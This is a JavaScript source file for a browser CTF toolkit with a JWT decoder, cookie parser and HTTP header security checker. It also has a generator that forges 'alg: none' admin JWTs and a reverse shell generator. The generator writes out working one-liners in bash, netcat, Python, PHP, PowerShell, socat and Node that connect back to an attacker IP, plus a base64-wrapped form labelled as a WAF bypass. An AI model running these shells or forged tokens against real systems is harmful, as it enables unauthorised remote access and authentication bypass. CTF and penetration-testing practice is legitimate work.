// Web tools for CTF Toolkit

// Helper for Base64URL Decoding (RFC 7519)
function base64UrlDecode(str) {
    let base64 = str.replace(/-/g, '+').replace(/_/g, '/');
    while (base64.length % 4 !== 0) {
        base64 += '=';
    }
    const binStr = atob(base64);
    const bytes = new Uint8Array(binStr.length);
    for (let i = 0; i < binStr.length; i++) {
        bytes[i] = binStr.charCodeAt(i);
    }
    return new TextDecoder('utf-8').decode(bytes);
}

// Helper for Base64URL Encoding
function base64UrlEncode(str) {
    const bytes = new TextEncoder().encode(str);
    let binStr = '';
    for (let i = 0; i < bytes.length; i++) {
        binStr += String.fromCharCode(bytes[i]);
    }
    return btoa(binStr).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
}

// JWT Decoder
function decodeJWT() {
    const jwtInput = document.getElementById('jwtInput').value.trim();
    
    if (!jwtInput) {
        ctfToolkit.showToast('Please enter a JWT token', 'error');
        return;
    }
    
    try {
        const parts = jwtInput.split('.');
        
        if (parts.length < 2 || parts.length > 3) {
            throw new Error('Invalid JWT format. Expected header.payload.signature.');
        }
        
        const header = JSON.parse(base64UrlDecode(parts[0]));
        const payload = JSON.parse(base64UrlDecode(parts[1]));
        const signature = parts[2] || '';
        
        ctfToolkit.formatOutput(document.getElementById('jwtHeader'), JSON.stringify(header, null, 2));
        ctfToolkit.formatOutput(document.getElementById('jwtPayload'), JSON.stringify(payload, null, 2));
        ctfToolkit.formatOutput(document.getElementById('jwtSignature'), signature || '[No signature attached]');
        
        ctfToolkit.toggleOutput('jwtOutputSection', true);
        
        // Security analysis
        checkJWTVulnerabilities(header, payload);
        
    } catch (error) {
        ctfToolkit.showToast('Error decoding JWT: ' + error.message, 'error');
    }
}

// Forged "alg: none" JWT Generator
function forgeJWTNoneAlg() {
    const headerEl = document.getElementById('jwtHeader');
    const payloadEl = document.getElementById('jwtPayload');
    const forgedOutput = document.getElementById('jwtForgedOutput');

    try {
        let headerObj = {};
        let payloadObj = {};

        if (headerEl && headerEl.textContent.trim()) {
            headerObj = JSON.parse(headerEl.textContent);
        } else {
            headerObj = { alg: 'none', typ: 'JWT' };
        }

        if (payloadEl && payloadEl.textContent.trim()) {
            payloadObj = JSON.parse(payloadEl.textContent);
        } else {
            const input = document.getElementById('jwtInput').value.trim();
            if (input) {
                const parts = input.split('.');
                payloadObj = JSON.parse(base64UrlDecode(parts[1]));
            } else {
                payloadObj = { user: 'admin', admin: true };
            }
        }

        // Set algorithm to 'none'
        headerObj.alg = 'none';

        const forgedToken = `${base64UrlEncode(JSON.stringify(headerObj))}.${base64UrlEncode(JSON.stringify(payloadObj))}.`;
        
        ctfToolkit.formatOutput(forgedOutput, forgedToken);
        ctfToolkit.toggleOutput('jwtForgedSection', true);
        ctfToolkit.showToast('Forged alg:none token generated!', 'success');
    } catch (err) {
        ctfToolkit.showToast('Failed to forge token: ' + err.message, 'error');
    }
}

function checkJWTVulnerabilities(header, payload) {
    const warnings = [];
    const info = [];
    
    // Check for 'none' algorithm
    if (header.alg && header.alg.toLowerCase() === 'none') {
        warnings.push('⚠️ CRITICAL: JWT uses "none" algorithm. Signature verification can be bypassed.');
    }
    
    // Check for HMAC algorithm
    if (header.alg && ['HS256', 'HS384', 'HS512'].includes(header.alg)) {
        info.push('ℹ️ INFO: JWT uses symmetric HMAC algorithm. Weak secrets can be cracked via hashcat or john.');
    }

    // Check for JWK/JKU header injection hints
    if (header.jwk || header.jku) {
        warnings.push('⚠️ NOTICE: Token contains "jwk" or "jku" headers. Test for key injection or SSRF.');
    }

    // Check expiration timestamps
    if (payload.exp) {
        const expDate = new Date(payload.exp * 1000);
        const now = new Date();
        if (expDate < now) {
            warnings.push('⚠️ EXPIRED: JWT expired on ' + expDate.toUTCString());
        } else {
            info.push('✓ Valid timestamp: Expires ' + expDate.toUTCString());
        }
    }

    if (payload.iat) {
        const iatDate = new Date(payload.iat * 1000);
        info.push('ℹ️ Issued At (iat): ' + iatDate.toUTCString());
    }
    
    // Remove old warning div if present
    const existingWarnings = document.querySelector('.jwt-warnings');
    if (existingWarnings) {
        existingWarnings.remove();
    }

    if (warnings.length > 0 || info.length > 0) {
        const warningDiv = document.createElement('div');
        warningDiv.className = 'jwt-warnings';
        let html = '<h4>Security & Token Analysis</h4>';
        if (warnings.length > 0) {
            html += warnings.join('<br>') + '<br>';
        }
        if (info.length > 0) {
            html += info.join('<br>');
        }
        warningDiv.innerHTML = html;
        document.getElementById('jwtOutputSection').appendChild(warningDiv);
    }
}

// Cookie Parser
function parseCookies() {
    let cookieInput = document.getElementById('cookieInput').value.trim();
    
    if (!cookieInput) {
        ctfToolkit.showToast('Please enter a cookie string', 'error');
        return;
    }
    
    try {
        // Strip leading header keywords if user pasted raw headers
        cookieInput = cookieInput.replace(/^cookie:\s*/i, '').replace(/^set-cookie:\s*/i, '');

        const cookies = {};
        const pairs = cookieInput.split(/;\s*/);
        
        pairs.forEach(pair => {
            const eqIndex = pair.indexOf('=');
            if (eqIndex > 0) {
                const name = pair.substring(0, eqIndex).trim();
                const value = pair.substring(eqIndex + 1).trim();
                cookies[name] = value;
            }
        });
        
        let output = 'Parsed Cookies:\n\n';
        for (const [name, rawValue] of Object.entries(cookies)) {
            // Trim outer quotes if present
            const value = rawValue.replace(/^"(.*)"$/, '$1');
            output += `[Key]:   ${name}\n[Value]: ${value}\n`;
            
            // Try Base64 / Base64URL decode
            try {
                if (value.length >= 4 && /^[A-Za-z0-9+/_-]+=*$/.test(value)) {
                    const decodedB64 = base64UrlDecode(value);
                    if (isPrintable(decodedB64) && decodedB64 !== value) {
                        output += `  → Base64 Decoded: ${decodedB64}\n`;
                    }
                }
            } catch (e) {}
            
            // Try URL decode
            if (value.includes('%')) {
                try {
                    const decodedUrl = decodeURIComponent(value);
                    if (decodedUrl !== value) {
                        output += `  → URL Decoded:    ${decodedUrl}\n`;
                    }
                } catch (e) {}
            }
            output += '\n';
        }
        
        ctfToolkit.formatOutput(document.getElementById('cookieOutput'), output.trim());
        ctfToolkit.toggleOutput('cookieOutputSection', true);
        
    } catch (error) {
        ctfToolkit.formatOutput(document.getElementById('cookieOutput'), 'Error parsing cookies: ' + error.message, true);
        ctfToolkit.toggleOutput('cookieOutputSection', true);
    }
}

// HTTP Headers Analyzer
function analyzeHeaders() {
    const headersInput = document.getElementById('headersInput').value.trim();
    
    if (!headersInput) {
        ctfToolkit.showToast('Please enter HTTP headers to analyze', 'error');
        return;
    }
    
    try {
        const headers = {};
        const lines = headersInput.split('\n');
        let analysis = 'HTTP Headers Analysis:\n\n';
        
        // Parse headers and handle duplicates (e.g. Set-Cookie)
        lines.forEach(line => {
            const colonIndex = line.indexOf(':');
            if (colonIndex > 0) {
                const name = line.substring(0, colonIndex).trim();
                const value = line.substring(colonIndex + 1).trim();
                const lower = name.toLowerCase();
                if (!headers[lower]) {
                    headers[lower] = { name, values: [] };
                }
                headers[lower].values.push(value);
            }
        });
        
        // Display headers with security recommendations
        for (const [key, { name, values }] of Object.entries(headers)) {
            values.forEach(val => {
                analysis += `${name}: ${val}\n`;
                const notes = analyzeHeaderSecurity(key, val);
                notes.forEach(note => {
                    analysis += `  → ${note}\n`;
                });
            });
            analysis += '\n';
        }
        
        // Check for missing security headers
        analysis += 'Security Posture Checks:\n';
        const essentialSecurityHeaders = [
            { key: 'strict-transport-security', label: 'Strict-Transport-Security (HSTS)' },
            { key: 'content-security-policy', label: 'Content-Security-Policy (CSP)' },
            { key: 'x-frame-options', label: 'X-Frame-Options (Clickjacking)' },
            { key: 'x-content-type-options', label: 'X-Content-Type-Options (MIME Sniffing)' },
            { key: 'referrer-policy', label: 'Referrer-Policy' },
            { key: 'permissions-policy', label: 'Permissions-Policy' }
        ];
        
        essentialSecurityHeaders.forEach(sh => {
            if (!headers[sh.key]) {
                analysis += `⚠️ Missing: ${sh.label}\n`;
            } else {
                analysis += `✓ Present: ${sh.label}\n`;
            }
        });
        
        ctfToolkit.formatOutput(document.getElementById('headersOutput'), analysis.trim());
        ctfToolkit.toggleOutput('headersOutputSection', true);
        
    } catch (error) {
        ctfToolkit.formatOutput(document.getElementById('headersOutput'), 'Error analyzing headers: ' + error.message, true);
        ctfToolkit.toggleOutput('headersOutputSection', true);
    }
}

function analyzeHeaderSecurity(headerName, headerValue) {
    const notes = [];
    const val = headerValue.toLowerCase();
    
    switch (headerName) {
        case 'server':
            notes.push(`Server version exposed: "${headerValue}". Check for known CVEs.`);
            break;
        case 'x-powered-by':
            notes.push(`Technology stack disclosed: "${headerValue}".`);
            break;
        case 'set-cookie':
            if (!val.includes('httponly')) {
                notes.push('⚠️ Missing HttpOnly attribute (cookie readable by JavaScript/XSS)');
            }
            if (!val.includes('secure')) {
                notes.push('⚠️ Missing Secure flag (cookie sent over plaintext HTTP)');
            }
            if (!val.includes('samesite')) {
                notes.push('⚠️ Missing SameSite attribute (vulnerable to CSRF)');
            }
            break;
        case 'access-control-allow-origin':
            if (headerValue === '*') {
                notes.push('⚠️ Permissive CORS: Wildcard origin (*) allowed.');
            }
            break;
        case 'x-frame-options':
            notes.push(`Frame protection: ${headerValue}`);
            break;
        case 'content-security-policy':
            if (val.includes('unsafe-inline')) {
                notes.push('⚠️ CSP allows unsafe-inline scripts.');
            }
            if (val.includes('unsafe-eval')) {
                notes.push('⚠️ CSP allows unsafe-eval (eval() execution permitted).');
            }
            break;
    }
    
    return notes;
}

// Reverse Shell Generator
function generateReverseShell() {
    const ip = document.getElementById('shellIp').value.trim() || '10.10.14.1';
    const port = document.getElementById('shellPort').value.trim() || '4444';
    const shellType = document.getElementById('shellType').value || 'bash';

    let payload = '';
    switch (shellType) {
        case 'bash':
            payload = `bash -i >& /dev/tcp/${ip}/${port} 0>&1`;
            break;
        case 'bash-read':
            payload = `exec 5<>/dev/tcp/${ip}/${port};cat <&5 | while read line; do $line 2>&5 >&5; done`;
            break;
        case 'nc-mkfifo':
            payload = `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${ip} ${port} >/tmp/f`;
            break;
        case 'nc-e':
            payload = `nc -e /bin/bash ${ip} ${port}`;
            break;
        case 'python3':
            payload = `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'`;
            break;
        case 'php':
            payload = `php -r '$sock=fsockopen("${ip}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'`;
            break;
        case 'powershell':
            payload = `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("${ip}",${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`;
            break;
        case 'socat':
            payload = `socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:${ip}:${port}`;
            break;
        case 'node':
            payload = `node -e 'require("child_process").exec("nc -e /bin/sh ${ip} ${port}")'`;
            break;
    }

    const b64 = btoa(payload);
    const b64Payload = `echo ${b64} | base64 -d | bash`;

    const result = `Raw Payload:\n${payload}\n\nBase64 Encoded One-Liner (WAF Bypass):\n${b64Payload}`;
    ctfToolkit.formatOutput(document.getElementById('shellOutput'), result);
    ctfToolkit.toggleOutput('shellOutputSection', true);
}

// Utility function to check if string contains only printable characters
function isPrintable(str) {
    return /^[\x20-\x7E\s]*$/.test(str);
}
